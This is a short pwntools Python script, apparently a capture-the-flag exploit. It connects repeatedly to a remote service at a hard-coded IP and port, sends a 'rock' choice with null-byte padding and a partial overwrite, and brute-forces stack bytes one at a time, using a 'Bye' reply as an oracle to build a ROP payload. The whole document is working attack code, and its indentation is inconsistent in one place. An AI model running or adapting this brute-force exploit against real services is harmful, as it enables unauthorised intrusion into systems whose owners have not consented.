from pwn import * 



def check_char(rop, c) : 
	for i in range(6) : 
		p = remote("34.126.105.174", 12345)
		#context.log_level = "debug" 
		rop_ = rop + c
		p.sendafter("Your choice: ", rop_)
		p.recvline()
 		try : 
			if "Bye" in p.recv() :
				return True 
		except : 
			p.close()
			continue
	return False 

rop = "rock" + "\x00" * 0x24 + '\x00\xc5' 
try : 
	for _ in range(15) : 
		for i in range(256) : 
			print(i)
			if check_char(rop, chr(i)) : 
				print("found : ",i)
				rop += chr(i)
				print(rop)
				break
		if i == 255 : 
			print("Wrong")
			print(rop)
			exit(0)
except : 
	print(rop)
